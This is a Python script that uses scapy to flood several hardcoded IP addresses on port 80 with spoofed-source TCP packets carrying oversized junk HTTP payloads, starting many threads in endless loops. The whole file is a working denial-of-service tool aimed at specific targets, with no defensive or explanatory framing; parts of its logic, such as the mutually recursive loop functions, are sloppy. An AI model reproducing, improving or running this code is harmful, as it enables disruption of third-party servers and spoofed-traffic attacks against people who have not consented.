from scapy.all import *
from threading import Thread
import random
import string

ips = []
bad_chrs = []

def gen_ip():
	ip = A = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
	if ip not in ips:
		ips.append(ip)
		n = len(ips)
		n = n-1
		return ips[random.randint(0,n)]
	if len(ips) == (255*255*255*255):
		return ips[random.randint(0,(255*255*255*255)-1)]

def gen_payload():
	payload = "GET / HTTP/1.1\n"
	payload += "\xff"*2500 + "\xa2\xe2\xff"*5016 + "\n\n"
	payload += "\n\n\n"
	return payload

def botter(ip,D):
	while True:
		addr = gen_ip()
		C = random.randint(1,65535)
		payload = gen_payload()
		spoofed_packet = IP(src=addr, dst=ip) / TCP(sport=C, dport=D) / payload
		send(spoofed_packet)

def ddos(ip,D):
	while True:
		addr = gen_ip()
		C = random.randint(1,65535)
		payload = gen_payload()
		spoofed_packet = IP(src=addr, dst=ip) / TCP(sport=C, dport=D) / payload
		send(spoofed_packet)

def threaded():
	ips = ["212.40.193.68", "212.40.193.69", "212.40.202.68", "185.178.208.7", "212.40.193.68", "212.40.193.69", "212.40.202.68", "185.178.208.7", "212.40.193.68", "212.40.193.69", "212.40.202.68", "185.178.208.7", "212.40.193.68", "212.40.193.69", "212.40.202.68", "185.178.208.7", "212.40.193.68", "212.40.193.69", "212.40.202.68", "185.178.208.7"]
	port = 80
	while True:
		for ip in ips:
			t = Thread(target=ddos, args=(ip,port))
			t.start()
			t1 = Thread(target=ddos, args=(ip,port))
			t1.start()
			t2 = Thread(target=ddos, args=(ip,port))
			t2.start()
			t3 = Thread(target=ddos, args=(ip,port))
			t3.start()
			t4 = Thread(target=ddos, args=(ip,port))
			t4.start()
			t5 = Thread(target=botter, args=(ip,port))
			t5.start()
			t6 = Thread(target=botter, args=(ip,port))
			t6.start()
			t7 = Thread(target=botter, args=(ip,port))
			t7.start()
			t8 = Thread(target=botter, args=(ip,port))
			t8.start()
			t9 = Thread(target=botter, args=(ip,port))
			t9.start()

def floder():
	while True:
		threaded()
		floder()
		stresser()

def stresser():
	while True:
		floder()
		threaded()
		stresser()

def porcoddio():
  while True:
    stresser()
    floder()
    threaded()

while True:
	porcoddio()